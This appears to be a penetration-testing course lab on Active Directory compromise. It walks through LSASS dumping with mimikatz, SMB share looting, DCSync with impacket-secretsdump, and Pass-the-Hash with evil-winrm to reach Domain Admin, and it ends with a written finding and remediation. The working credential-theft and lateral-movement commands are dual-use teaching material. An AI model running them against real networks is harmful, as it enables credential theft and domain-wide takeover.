1. A Password, a Hash, and a Ticket · foundation

🧠
mimikatz: why one admin login infects everything

Windows keeps the credentials of everyone currently logged into a machine in memory, in a process called LSASS, so it doesn't have to ask for your password every five minutes. In 2011 a tool called mimikatz made reading those credentials out of memory trivial. Dump LSASS on one machine and you get the password hashes (and sometimes plaintext) of every account that's touched it, including any admin who logged in to fix something. Those credentials then open the next machine. This is the engine of nearly every ransomware outbreak: dump creds, reuse them, repeat, until you hit a Domain Admin.

The uncomfortable part: you usually don't even need to crack anything. In Windows, the hash is often as good as the password.

A credential shows up in three forms, and you need to recognize all three. The last one is the one that breaks people's intuition.

Cleartext password The actual password. Best case, sometimes sitting in LSASS memory or a config file.
NTLM hash A fixed scramble of the password. You might crack it with hashcat, or you might not need to.
Kerberos ticket A time-limited proof of identity from the DC. Steal it and you're that user until it expires.
🤔 You dump an admin's NTLM hash from memory but you can't crack it, it's long and random. Most people think they're stuck. Why are you actually already done? Guess.
Answer

Pass-the-Hash. Windows authentication (NTLM) proves you know the password by using the hash directly in the handshake, never the plaintext. So if you have the hash, you can authenticate as that user without ever knowing or cracking the password. The hash is the password as far as NTLM cares. That's why dumping one admin's hash is often game over.

🟢 Baseline · find the next credential in a share

  1. List the shares with your cracked account, and look for ones a normal user shouldn't see (backup, scripts, IT): 
    smbclient -L //<DC_IP>/ -U '<user>%<pass>'
  2. Connect to an interesting share and pull any files out of it: 
    smbclient //<DC_IP>/backup -U '<user>%<pass>'
smb> get <file>
  3. Read it. Credential files are often base64-encoded, not encrypted. Decode and you have a better account: 
    echo '<base64 string>' | base64 -d
🗝️
This is lateral movement

You started as one low-priv user and used them to reach a second, more useful account. That's the whole pattern: each credential gets you the next one. Do it enough times and you reach an account with the keys to the Domain Controller.

3. DCSync: Steal Every Password in the Domain · credential access

Some accounts have the right to ask the Domain Controller to replicate its data, which includes every account's password hash. If your pillaged account has that right, you don't attack the DC, you just politely ask it for all the hashes. That's DCSync.

🟡 Stretch · dump the domain's hashes

  1. With an account that has replication rights, run secretsdump against the DC: 
    impacket-secretsdump -just-dc <domain>/<user>:<pass>@<DC_IP>
  2. It prints every account and its NTLM hash, including the domain Administrator: 
    Administrator:500:aad3b…:<the admin's NTLM hash>:::
# format is  user:RID:LM-hash:NTLM-hash:::  (you want the NTLM, 4th field)
  3. You now hold the Administrator's hash. You won't crack it, you don't need to.
The on-host way: mimikatz

If you're on a Windows box as admin instead of attacking over the network, mimikatz does the memory version: sekurlsa::logonpasswords dumps credentials of everyone logged into that machine, and lsadump::sam reads the local accounts. Same goal, different vantage point. secretsdump is the remote tool; mimikatz is the one you run once you're standing on the box.

4. Going Pro: Pass-the-Hash to Domain Admin · lateral movement

You have the Administrator's NTLM hash but not the password. Pass-the-Hash authenticates with the hash directly. One command and you have an interactive shell as the Domain Admin.

🔴 Going Pro · log in with a hash, own the domain

evil-winrm · a shell as Administrator, using only the hash
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_hash>

*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
<domain>\administrator        # Domain Admin. the whole company is yours.

No password was ever cracked or typed. The -H flag passes the hash straight into the NTLM handshake. From here you can read any file, reset any account, and deploy to every machine in the domain. That is total compromise, the thing the whole module was building toward.

When the DC is on an internal-only network: pivoting

Often the machine you first land on can reach the DC, but you can't directly. You pivot: turn your foothold into a tunnel. chisel sets up the tunnel and proxychains pushes your tools (evil-winrm, secretsdump) through it, so they reach the internal subnet as if you were on it. You meet this properly in the capstone; for now, know that "I can't reach the DC directly" is a routing problem, not a dead end.

5. Write the Finding · document

The report that documents full domain compromise is the most important one you'll write. It should make the chain obvious: one weak password led, step by step, to everything.

📓 FINDING · Full domain compromise via credential reuse and Pass-the-Hash severity: Critical
TitleLow-privilege foothold escalated to Domain Admin via credential reuse, DCSync, and Pass-the-Hash
SeverityCritical · CVSS 9.8 (full control of the domain and every machine in it)
Affected scopeThe entire Active Directory domain
Steps to reproduce1. Authenticated SMB with a cracked account exposes a credentials file in a readable share. 2. That account has replication rights, so impacket-secretsdump -just-dc dumps the domain hashes including Administrator. 3. evil-winrm -H <hash> logs in as Administrator with no password. Evidence: whoami returns the domain admin.
ImpactComplete, unrecoverable compromise. The attacker can read all data, deploy ransomware domain-wide, and persist indefinitely. This is the endgame of every real AD intrusion.
RemediationDon't store passwords in shares; use a vault. Remove unneeded replication rights. Tier administration so DAs never log into normal workstations (stops the LSASS dump). Enforce LAPS for local admin passwords, and consider disabling NTLM where possible.

That's the full internal attack chain: enumerate (Lab 10), steal a credential (Lab 11), spread it to Domain Admin (Lab 12). Next week you learn to write all of it up like a professional.
